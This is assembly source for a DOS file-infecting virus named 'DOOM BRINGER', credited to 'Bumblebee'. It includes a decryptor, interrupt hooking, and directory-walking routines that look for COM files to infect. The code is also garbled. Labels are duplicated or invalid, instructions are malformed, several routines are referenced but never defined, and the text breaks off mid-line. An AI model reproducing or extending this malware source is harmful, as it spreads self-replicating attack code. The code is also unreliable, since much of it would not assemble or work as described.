comment *
			     DOOM BRINGER 		 	 
		Coded by Bumblebee
		 on 25-10-93

	    Dismal Specifications for V1.0: (Decima Series)

TASM /M doom.asm
TMPL doom.dat
LINK doom
EXEC doom.exe

*

		; leave five one bytes space
		db	0cdh,020h,0,0,0

		; jmp to actual virus code
j_jmp_virus_code:	jmp	virus_start
		
		; signature of dismal spec. v1.0
signature:		db	'BOOmed!$'

		; jump over encrypted part
j_encrypted_part:	jmp	the_end

		; decryptor needed 'cus the original virus code
		; is now filled with ones and zeros (wahaha!)
decryptor:	mov	bx,offset virus_start+decrypted_size
		mov	dl,cs:[bx]
		inc	bx
encryptor_later:	mov	cs:[bp-(offset encryptor_later+2)],dl
		xor	word ptr cs:[bx],dl
		mov	dl,cs:[bx]
		xor	cs:[bx],dl
		mov	cs:[bx],dl
next_byte:	sub	bx,2
		loop	next_byte


virus_start:	push	ax			; store registers
		push	cx
		push	si
		push	di
		push	ds
		push	es

		mov	ax,7914h		; hook int 17h
		push	cs
		pop	es
		mov	bx,offset j_i17
		INT	21h

		cli				; set new int handler
		mov	word ptr es:i17,bx
		mov	word ptr es:i17+2,es
		sti

		mov	ah,2fh			; get DTA address
		int	21h
		mov	last_dta,si		; and save it

find_new_file:	mov	ah,4eh			; find first file
		cmp	byte ptr last_fcb+11h,0
		je	fnddir
		mov	dx,last_fcb
		xor	cx,cx
		int	21h
		jnc	chkda
fnddir:		mov	ah,4fh			; find next file
		int	21h
chkda:		call	check_da			; check if \. or \..
		jc	open_file			; no dot-dot, open file
		mov	ah,3bh			; otherwise, change dir
		mov	dx,new_dir		;   to directory specified
		int	21h
		jnc	find_new_file		; find another file there


		mov	ax,3d02h		; no more files -> infect all COM
		mov	dx,last_dta+30h		;   files in this directory
		int	21h

open_file:	push	cs
		pop	ds
		mov	hdl,ax			; save handle
		mov	ah,3fh			; read the first 16 bytes
		mov	bx,hdl
		mov	cx,10h
		mov	dx,offset buffer
		int	21h


check_boot_sector:	cmp	byte ptr [buffer],0ebh ; boot sector?
		je	close_exit		; yes, skip this file



		cmp	byte ptr [buffer],'M'	; infected?
		je	close_exit		; yes, skip this file


		cmp	byte ptr [buffer],'Z'	; COM file infected?
		je	close_exit		; yes, skip this file

infect_com_file:	call	infect_file		; infect the file

close_exit:	mov	ah,3eh			; close file
		mov	bx,hdl
		int	21h

		mov	ah,3bh			; go back to the original dir
		mov	dx,default_dir
		int	21h

		jmp	find_new_file		; find another file


new_dir:		dd	"\DOOM\BOOT",0
default_dir:	dd	"\DISHR\DISC",0

last_fcb:		db	1ah dup(0)
buffer: 		db	16 dup(0)		; buffer for file data
hdl: 			dw	0			; file handle

j_i17: 			mov	al,0a0h		; i17 vector
		jmp	0

the_end:		pop	es			; restore registers
		pop	ds
		pop	di
		pop	si
		pop	cx
		pop	ax
		ret				; return control to host program

check_da:		add	si,11h
		lodsb
		cmp	al,'.'
		jne	out
		lodsb
		cmp	al,'.'
		jne	out
		retn -1
out:			retn -1



		; this needs to be decrypted when reading
i17: 			cmp	ah,4eh			; find first/next ?
		jne	not_find_xfer
		push	ax
		push	bx
		push	cx
		push	dx
		push	es
		push	ds
not_find_xfer:	mov	al,0a0h
		out	al,es:[bx]
		jmp	short not_0a0

i21_tab:		db	0eah			; patched int 21h vector
i21_off:		dw	0
i21_seg:		dw	0

i17: 			pop	ds
		pop	es
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		or	al,al
		jnz	found_xfer
		push	ax
		push	bx
		push	cx
		push	dx
		push	es
		push	ds
found_xfer: 	mov	al,0a0h		; pass call to original int 21h
		out	al,es:[bx]
		jmp	short ok_0a0

		; original int 21h vector
o21: 			dw	0b3b5h
o21_s: 			dw	0

ok_0a0: 		pop	ds
		pop	es
		pop	dx
		pop	cx
		pop	bx
		pop	ax
not_0a0: 		irps	x,<o21_s,o21>
		lodsw
		push	ax
		lodsw
		push	ax
		jmp	short i_ret

0a0: 			mov	al,0a0h		; passtrough int 21h calls
		out	al,es:[bx]		;   to new handler
		jmp	short i_ret

not_find_xfer2:	mov	al,0a0h
		out	al,es:[bx]
		jmp	short not_0a0

transfer_data:	call	i21_tab			;o21
		jc	error_xfer		; error???
		push	ax
		push	bx
		push	cx
		push	dx
		push	es
		push	ds
error_xfer:	mov	ax,es
		push	cs
		pop	es
		mov	ah,2ch			; get time
		int	21h
		test	dx,1			; sec = odd?
		jz	abort_xfer		; yep, abort transfer
		mov	ax,es
		push	cs
		pop	es
		mov	ah,2fh			; get DTA address
		int	21h
		push	ax
		push	ds
		pop	es
		mov	dx,di			; set DTA to zero
		mov	ax,0
		call	set_dta
		mov	ah,4eh			; find first file
		mov	dx,offset fcb_starcom
		mov	cx,7
		int	21h
		jc	no_files_found		; no com files found
found_next: 	call	check_da			; check if \. or \..
		jc	open_and_xfer		; no dot-dot, open file
		mov	ah,4fh			; otherwise, change directory
		mov	dx,new_dir		;   to directory specified
		int	21h
		jc	abort_xfer		; error???
		jmp	short find_another

no_files_found: 	pop	es
		pop	ax
		jmp	short abort_xfer		; error???

find_another:	jmp	find_new_file

open_and_xfer: 	pop	es
		pop	ax
		cld
		push	ax
		push	cs
		pop	ds
		mov	hdl,ax			; save handle
		mov	ah,3fh			; read the first 16 bytes
		mov	bx,hdl
		mov	cx,10h
		mov	dx,offset buffer
		call	i21_tab			;o21
		call	infect_file		; infect the file
		mov	ah,3fh			; write the first 